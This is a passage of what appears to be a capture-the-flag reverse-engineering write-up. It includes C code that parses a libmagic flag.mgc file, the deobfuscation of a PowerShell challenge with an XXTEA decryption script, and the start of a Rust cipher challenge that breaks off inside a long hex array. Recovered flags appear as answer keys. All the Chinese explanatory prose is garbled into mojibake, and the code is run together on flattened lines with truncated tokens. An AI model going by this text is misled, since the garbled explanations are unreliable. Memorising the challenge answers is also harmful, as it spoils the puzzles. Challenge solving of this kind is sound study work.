FILE_DEFAULT 3#define FILE_LONG 4#define FILE_STRING 5#define FILE_DATE 6#define FILE_BESHORT 7#define FILE_BELONG 8#define FILE_BEDATE 9#define FILE_LESHORT 10#define FILE_LELONG 11#define FILE_LEDATE 12#define FILE_PSTRING 13#define FILE_LDATE 14#define FILE_BELDATE 15#define FILE_LELDATE 16#define FILE_REGEX 17#define FILE_BESTRING16 18#define FILE_LESTRING16 19#define FILE_SEARCH 20#define FILE_MEDATE 21#define FILE_MELDATE 22#define FILE_MELONG 23#define FILE_QUAD 24#define FILE_LEQUAD 25#define FILE_BEQUAD 26#define FILE_QDATE 27#define FILE_LEQDATE 28#define FILE_BEQDATE 29#define FILE_QLDATE 30#define FILE_LEQLDATE 31#define FILE_BEQLDATE 32#define FILE_FLOAT 33#define FILE_BEFLOAT 34#define FILE_LEFLOAT 35#define FILE_DOUBLE 36#define FILE_BEDOUBLE 37#define FILE_LEDOUBLE 38#define FILE_BEID3 39#define FILE_LEID3 40#define FILE_INDIRECT 41#define FILE_QWDATE 42#define FILE_LEQWDATE 43#define FILE_BEQWDATE 44#define FILE_NAME 45#define FILE_USE 46#define FILE_CLEAR 47#define FILE_DER 48#define FILE_GUID 49#define FILE_OFFSET 50#define FILE_BEVARINT 51#define FILE_LEVARINT 52#define FILE_NAMES_SIZE 53 /* size of array to contain all names */#define IS_STRING(t) \\ ((t) == FILE_STRING || \\ (t) == FILE_PSTRING || \\ (t) == FILE_BESTRING16 || \\ (t) == FILE_LESTRING16 || \\ (t) == FILE_REGEX || \\ (t) == FILE_SEARCH || \\ (t) == FILE_INDIRECT || \\ (t) == FILE_NAME || \\ (t) == FILE_USE)#define FILE_FMT_NONE 0#define FILE_FMT_NUM 1 /* \"cduxXi\" */#define FILE_FMT_STR 2 /* \"s\" */#define FILE_FMT_QUAD 3 /* \"ll\" */#define FILE_FMT_FLOAT 4 /* \"eEfFgG\" */#define FILE_FMT_DOUBLE 5 /* \"eEfFgG\" */ /* Word 3 */ uint8_t in_op; /* operator for indirection */ uint8_t mask_op; /* operator for mask */#ifdef ENABLE_CONDITIONALS uint8_t cond; /* conditional type */#else uint8_t dummy;#endif uint8_t factor_op;#define FILE_FACTOR_OP_PLUS '+'#define FILE_FACTOR_OP_MINUS '-'#define FILE_FACTOR_OP_TIMES '*'#define FILE_FACTOR_OP_DIV '/'#define FILE_FACTOR_OP_NONE '\\0'#define FILE_OPS \"&amp;|^+-*/%\"#define FILE_OPAND 0#define FILE_OPOR 1#define FILE_OPXOR 2#define FILE_OPADD 3#define FILE_OPMINUS 4#define FILE_OPMULTIPLY 5#define FILE_OPDIVIDE 6#define FILE_OPMODULO 7#define FILE_OPS_MASK 0x07 /* mask for above ops */#define FILE_UNUSED_1 0x08#define FILE_UNUSED_2 0x10#define FILE_OPSIGNED 0x20#define FILE_OPINVERSE 0x40#define FILE_OPINDIRECT 0x80#ifdef ENABLE_CONDITIONALS#define COND_NONE 0#define COND_IF 1#define COND_ELIF 2#define COND_ELSE 3#endif /* ENABLE_CONDITIONALS */ /* Word 4 */ int32_t offset; /* offset to magic number */ /* Word 5 */ int32_t in_offset; /* offset from indirection */ /* Word 6 */ uint32_t lineno; /* line number in magic file */ /* Word 7,8 */ union &#123; uint64_t _mask; /* for use with numeric and date types */ struct &#123; uint32_t _count; /* repeat/line count */ uint32_t _flags; /* modifier flags */ &#125; _s; /* for use with string types */ &#125; _u;#define num_mask _u._mask#define str_range _u._s._count#define str_flags _u._s._flags /* Words 9-24 */ union VALUETYPE value; /* either number or string */ /* Words 25-40 */ char desc[MAXDESC]; /* description */ /* Words 41-60 */ char mimetype[MAXMIME]; /* MIME type */ /* Words 61-62 */ char apple[8]; /* APPLE CREATOR/TYPE */ /* Words 63-78 */ char ext[64]; /* Popular extensions */&#125;;int main()&#123; char flag[1000],flag_index[1000]; FILE *fp = fopen(\"./flag.mgc\",\"rb\"); struct magic buffer[100]; fseek(fp,0x178,SEEK_SET); fread(buffer,sizeof(struct magic),0x42,fp); int xor_val = 0; for(int i=0;i&lt;0x42;i++)&#123; //printf (\"% d\\n\",buffer [i].mask_op);// è¾“å‡ºå…¨æ˜¯ 2, å¯¹ç…§ mask_op, å¯çŸ¥æ˜¯å¼‚æˆ–æ“ä½œ if(buffer[i].mask_op)&#123; xor_val = buffer[i]._u._mask&amp;0xff; &#125; else&#123; xor_val = 0; &#125; switch(buffer[i].type)&#123; case FILE_BYTE: //printf(\"8%c\\n\",buffer[i].value.b); flag[flag_index[buffer[i].offset]] = buffer[i].value.b^xor_val; break; case FILE_SHORT: case FILE_BESHORT: case FILE_LESHORT: //printf(\"16%c\\n\",buffer[i].value.h); flag_index[buffer[i].offset] = buffer[i].value.h^xor_val; break; case FILE_DATE: case FILE_BEDATE: case FILE_LEDATE: case FILE_MEDATE: case FILE_LDATE: case FILE_BELDATE: case FILE_LELDATE: case FILE_MELDATE: case FILE_LONG: case FILE_BELONG: case FILE_LELONG: case FILE_MELONG: case FILE_FLOAT: case FILE_BEFLOAT: case FILE_LEFLOAT: printf(\"32%c\",buffer[i].value.l); break; case FILE_QUAD: case FILE_BEQUAD: case FILE_LEQUAD: case FILE_QDATE: case FILE_QLDATE: case FILE_QWDATE: case FILE_BEQDATE: case FILE_BEQLDATE: case FILE_BEQWDATE: case FILE_LEQDATE: case FILE_LEQLDATE: case FILE_LEQWDATE: case FILE_DOUBLE: case FILE_BEDOUBLE: case FILE_LEDOUBLE: case FILE_OFFSET: case FILE_BEVARINT: case FILE_LEVARINT: printf(\"%c\",buffer[i].value.q); break; case FILE_STRING: case FILE_PSTRING: case FILE_BESTRING16: case FILE_LESTRING16: case FILE_REGEX: case FILE_SEARCH: case FILE_DEFAULT: case FILE_INDIRECT: case FILE_NAME: case FILE_USE: case FILE_CLEAR: case FILE_DER: case FILE_GUID: //printf(\"%s\\n\",buffer[i].value.s); for(int k=0;k&lt;buffer[i].vallen;k++)&#123; flag[k+buffer[i].offset] = buffer[i].value.s[k]; &#125; break; default: break; &#125; &#125; int len=0; for(int i=0;i&lt;100;i++)&#123; printf(\"%c\",flag[i]); //flag&#123;_oh_yes_you_got_the_flag___^_^__&#125; &#125;&#125;# ez_code æ‰“å¼€é¢˜ç›®çœ‹åˆ° % , $ ç­‰ç¬¦å·ï¼ŒçŒœæµ‹è¿™æ˜¯ ps1 çš„æ··æ·† åç¼€æ”¹æˆ ps1 è¿è¡Œä¸€ä¸‹ï¼Œæœç„¶æ˜¯æœ‰è¾“å‡ºçš„ çœ‹äº†ä¸€ä¸‹å¥½åƒæ˜¯ç”¨ lodan æ¥æ··æ·†çš„ è¿™ç¯‡æ–‡ç« è®²çš„æŒºå¥½çš„ https://bbs.kanxue.com/thread-271570.htm, åœ¨ powershell ä¸­ï¼Œ $ ä¾¿å¯ä»¥å»è¡¨ç¤ºä¸€ä¸ªå˜é‡ +$() ç­‰ä»·äº 0, $(@&#123;&#125;) ä¼šå¾—åˆ° System.Collections.Hashtable å¯¹äºè§£é‡Šå‹è¯­è¨€æ¯”å¦‚ js , python , ps ç­‰ç­‰ï¼Œè¦æ˜¯é€†å‘çœ‹åˆ°è¿™äº›ç±»å‹ï¼Œä¸è®ºæ··æ·†æˆå•¥æ ·ï¼ŒæŠŠä»£ç æ‰£ä¸‹æ¥ï¼ŒåŠ ä¸ª console.log , print , echo è·‘ä¸€ä¸‹ï¼Œæƒ³è¦çŸ¥é“çš„å˜é‡å°±å…¨çŸ¥é“äº† è¿™é¢˜æˆ‘ä»¬å°±å¯ä»¥ç”¨ echo æ‰“å°å‡ºæ„Ÿå…´è¶£çš„å˜é‡ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº† iex , [CHar] , è¿™äº›åœ¨ powershell ä¸­æ˜¯å¾ˆé‡è¦çš„å­˜åœ¨ éšåæˆ‘ä»¬ä¾¿å¯ä»¥æ‰“å¼€ sublime ç„¶åå…¨å±€æ›¿æ¢ä¸€ä¸‹è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç‰¹æ®Šç¬¦å· æŠŠ [CHar] æ›¿æ¢æˆç©ºå­—ç¬¦ä¸²ï¼Œ+ å·æ¢æˆç©ºæ ¼ï¼Œç„¶åä¸¢åˆ°å¨å­é‡Œé¢ å¾—åˆ° ps1 è„šæœ¬ï¼Œä¸€çœ¼ xxtea class chiper(): def __init__(self): self.d = 0x87654321 k0 = 0x67452301 k1 = 0xefcdab89 k2 = 0x98badcfe k3 = 0x10325476 self.k = [k0, k1, k2, k3] def e(self, n, v): from ctypes import c_uint32 def MX(z, y, total, key, p, e): temp1 = (z.value >> 6 ^ y.value &lt;&lt; 4) + \\ (y.value >> 2 ^ z.value &lt;&lt; 5) temp2 = (total.value ^ y.value) + \\ (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2) key = self.k delta = self.d rounds = 6 + 52//n total = c_uint32(0) z = c_uint32(v[n-1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n-1): y = c_uint32(v[p+1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n-1] = c_uint32(v[n-1] + MX(z, y, total, key, n-1, e).value).value z.value = v[n-1] rounds -= 1 return v def bytes2ints(self,cs:bytes)->list: new_length=len(cs)+(8-len(cs)%8)%8 barray=cs.ljust(new_length,b'\\x00') i=0 v=[] while i &lt; new_length: v0 = int.from_bytes(barray[i:i+4], 'little') v1 = int.from_bytes(barray[i+4:i+8], 'little') v.append(v0) v.append(v1) i += 8 return vdef check(instr:str,checklist:list)->int: length=len(instr) if length%8: print(\"Incorrect format.\") exit(1) c=chiper() v = c.bytes2ints(instr.encode()) output=list(c.e(len(v),v)) i=0 while(i&lt;len(checklist)): if i&lt;len(output) and output[i]==checklist[i]: i+=1 else: break if i==len(checklist): return 1 return 0 if __name__==\"__main__\": ans=[1374278842, 2136006540, 4191056815, 3248881376] # generateRes() flag=input('Please input flag:') res=check(flag,ans) if res: print(\"Congratulations, you've got the flag!\") print(\"Flag is *ctf&#123;your_input&#125;!\") exit(0) else: print('Nope,try again!')unction _/==/=__=_&#123; [CmdletBinding()] param( [Parameter(Position = 0)] [String] $param1 ) $result = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($param1)) return $result&#125;Function _\\/_\\_=&#123; [CmdletBinding()] param( [Parameter(Position = 0)] [String] $param1 ) $param1 = _/==/=__=_ -param1 $param1 $result = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($param1)) $result | out-null&#125;_\\/_\\_= (\"S21OMFpudG9hR2hmY0hkemFGOXBjMTlsWVhONVgzSnBaMmgwUDMwPQ==\")echo \"Do you konw PWSH?\"å¤ª easy äº†ï¼Œexp å¦‚ä¸‹ from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value >> 6 ^ y.value &lt;&lt; 4) + \\ (y.value >> 2 ^ z.value &lt;&lt; 5) temp2 = (total.value ^ y.value) + \\ (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): delta = 0x87654321 rounds = 6 + 52 // n total = c_uint32(0) z = c_uint32(v[n - 1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n - 1): y = c_uint32(v[p + 1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value z.value = v[n - 1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x87654321 rounds = 6 + 52 // n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v# testif __name__ == \"__main__\": # è¯¥ç®—æ³•ä¸­æ¯æ¬¡å¯åŠ å¯†ä¸åª 64bit çš„æ•°æ®ï¼Œå¹¶ä¸”åŠ å¯†çš„è½®æ•°ç”±åŠ å¯†æ•°æ®é•¿åº¦å†³å®š v = [1374278842, 2136006540, 4191056815, 3248881376] k = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476] n = 4 res = decrypt(n, v, k) flag = b'' for i in res: flag += i.to_bytes(4, 'little') print(flag) # yOUar3g0oD@tPw5H# boring cipher ida åŠ¨è°ƒä¸€ä¸‹ï¼Œæ–­ç‚¹æ‰“åœ¨è¿™é‡Œ ä¸Šé¢ obfstr::xref::inner::h7a99f28656c7fd53 æ˜¯ github ä¸Šçš„å¼€æºä»£ç ï¼Œä½œç”¨æ˜¯æ··æ·†å­—ç¬¦ä¸² è¿˜æœ‰ä¸ªæ–‡ä»¶è¯»å–çš„å‡½æ•° std::fs::read::inner::hb6a137b36c73a8b4 , å®ƒè¯»å–çš„æ˜¯ /proc/self/exe , é‚£ä¹ˆä¸Šé¢çš„æ··æ·†å­—ç¬¦ä¸²åº”è¯¥å°±æ˜¯ä¸ºäº†è¿™ä¸ªæ–‡ä»¶è¯»å–æ¥åšæ©æŠ¤çš„ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯é¢˜ç›®çš„è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆ output çš„å¤§å°å’Œç¨‹åºæœ¬èº«çš„å¤§å°æ˜¯ä¸€æ ·çš„ â€‹ é¢å¯¹å¤æ‚çš„åŠ å¯†ï¼Œä»æ­£å‘å¼€å§‹å…¥æ‰‹ç»å¯¹æ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹© import mathimport numpy as np_arr = [0x0000002A, 0x0000005B, 0x0000007E, 0x000000C1, 0x000000DC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002A, 0x0000002C, 0x00000059, 0x0000006F, 0x00000078, 0x0000008E, 0x000000BD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000004, 0x0000000E, 0x00000088, 0x0000008B, 0x000000B4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000038, 0x000000A6, 0x000000AE, 0x000000C3, 0x000000E3, 0x000000E8, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000016, 0x00000058, 0x0000005D, 0x00000078, 0x000000AE, 0x000000BB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005B, 0x00000089, 0x0000009D, 0x000000B7, 0x000000C5, 0x000000C6, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000016, 0x00000020, 0x00000047, 0x0000008F, 0x00000098, 0x000000CC, 0x000000DF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000070, 0x000000A8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000062, 0x00000068, 0x000000C2, 0x000000EA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x0000000D, 0x0000002F, 0x00000044, 0x00000057, 0x0000007F, 0x000000DB, 0x000000E3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000B, 0x00000018, 0x00000059, 0x00000086, 0x000000DD, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000031, 0x0000003D, 0x00000040, 0x00000097, 0x0000009D, 0x0000009E, 0x000000A1, 0x000000C7, 0x000000CD, 0x000000E2, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x00000020, 0x00000025, 0x00000035, 0x00000044, 0x00000055, 0x00000072, 0x000000CB, 0x000000DA, 0x000000DD, 0x000000ED, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000044, 0x00000052, 0x00000085, 0x00000093, 0x000000B4, 0x000000CB, 0x000000E3, 0x000000F0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000052, 0x00000059, 0x000000A2, 0x000000BE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002D, 0x00000055, 0x0000005B, 0x00000084, 0x000000C4, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000037, 0x00000041, 0x00000051, 0x00000053, 0x00000075, 0x00000076, 0x000000EA, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000F, 0x00000040, 0x0000006B, 0x0000009C, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000005, 0x00000011, 0x00000014, 0x00000017, 0x00000021, 0x00000058, 0x00000061, 0x0000006A, 0x00000083, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000026, 0x00000090, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006B, 0x0000006C, 0x00000086, 0x0000008C, 0x00000093, 0x000000F7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000010, 0x00000013, 0x0000007C, 0x000000C0, 0x000000CB, 0x000000F3, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000007C, 0x0000007F, 0x00000083, 0x00000086, 0x000000D9, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x00000032, 0x0000006D, 0x00000081, 0x000000BF, 0x000000ED, 0x000000FA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000022, 0x00000030, 0x00000032, 0x00000036, 0x0000005C, 0x000000D3, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000004, 0x00000009, 0x00000014, 0x00000080, 0x0000008E, 0x00000098, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001F, 0x00000064, 0x000000B6, 0x000000C4, 0x000000DD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000042, 0x00000056, 0x0000008E, 0x000000AF, 0x000000DD, 0x000000EF, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000032, 0x00000045, 0x0000004E, 0x0000006D, 0x00000075, 0x0000008F, 0x000000C8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000018, 0x0000005A, 0x0000005F, 0x0000006B, 0x00000096, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x0000006A, 0x000000CF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000003F, 0x00000065, 0x000000C2, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004F, 0x00000050, 0x00000063, 0x000000C3, 0x000000CB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000009B, 0x000000BC, 0x000000EE, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000023, 0x0000003E, 0x00000042, 0x00000078, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000033, 0x00000036, 0x00000046, 0x0000007A, 0x00000083, 0x000000B2, 0x000000BE, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006E, 0x000000A5, 0x000000A6, 0x000000A7, 0x000000A9, 0x000000B7, 0x000000D2, 0x000000E5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000017, 0x0000004F, 0x00000050, 0x00000062, 0x0000007E, 0x00000091, 0x00000097, 0x000000B1, 0x000000E4, 0x000000E9, 0x000000EC, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000051, 0x00000057, 0x0000005E, 0x000000B3, 0x000000DC, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000000C, 0x0000004B, 0x0000005A, 0x0000008D, 0x00000095, 0x000000B8, 0x000000DB, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x0000008B, 0x000000D8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000006A, 0x0000007B, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005E, 0x0000006B, 0x000000AB, 0x000000AF, 0x000000F5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001B, 0x00000058, 0x0000008C, 0x00000096, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000050, 0x000000B5, 0x000000E5, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000007, 0x00000052, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001D, 0x0000006D, 0x0000006F, 0x0000007C, 0x0000009F, 0x000000B7, 0x000000BE, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000002B, 0x00000075, 0x00000089, 0x000000A3, 0x000000D0, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002E, 0x000000CD, 0x000000F4, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x00000012, 0x00000042, 0x00000070, 0x00000075, 0x00000079, 0x00000097, 0x00000099, 0x000000BF, 0x000000CE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x0000007D, 0x00000088, 0x000000A3, 0x000000B8, 0x000000C9, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000001E, 0x00000052, 0x00000086, 0x000000AE, 0x000000D7, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000D, 0x000000AD, 0x000000AF, 0x000000C0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 